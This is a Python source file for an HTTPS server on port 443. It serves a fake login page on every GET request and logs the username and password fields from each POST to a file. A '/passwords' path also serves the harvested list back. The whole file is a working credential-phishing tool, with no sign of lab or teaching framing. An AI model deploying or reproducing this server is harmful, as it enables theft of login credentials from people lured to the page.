from http.server import HTTPServer
from http.server import BaseHTTPRequestHandler
from http.server import SimpleHTTPRequestHandler
import logging, ssl

def setup_logger(name, log_file, level=logging.INFO):
    """To setup the loggers"""

    file_handler = logging.FileHandler(log_file)
    formatter = logging.Formatter('%(asctime)s : %(levelname)s : %(name)s : %(message)s')
    file_handler.setFormatter(formatter)

    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.addHandler(file_handler)

    return logger

http_get_logger = setup_logger('http-log','http-log.log')

class HTTPHandler(SimpleHTTPRequestHandler):
	def _set_headers(self):
		self.send_response(200)
		self.send_header("Content-type", "text/html")
		self.end_headers()

	def do_GET(self):
			http_get_logger.info(f'{self.client_address}')
			if self.path == '/passwords':
				self.path = '/passwords.txt'
				return SimpleHTTPRequestHandler.do_GET(self)
			else:
				self.path = '/login.html'
				return SimpleHTTPRequestHandler.do_GET(self)




	def do_POST(self):
		content_length = int(self.headers.get('Content-Length', 0))
		config_string = self.rfile.read(content_length).decode("UTF-8")
		self.path = '/login.html'
		index1 = config_string.find('=')
		index2 = config_string.find('&')
		index3 = config_string.rfind('&')
		http_get_logger.info(f'{config_string[index1+1:index2]}\t{config_string[index2+10:index3]}')
		return SimpleHTTPRequestHandler.do_GET(self)



def run(server_class=HTTPServer, handler_class=HTTPHandler):
	server_address = ('', 443)
	httpd = server_class(server_address, handler_class)
	httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='/home/ubuntu/entangle/localhost.pem', ssl_version=ssl.PROTOCOL_TLS)
	httpd.serve_forever()
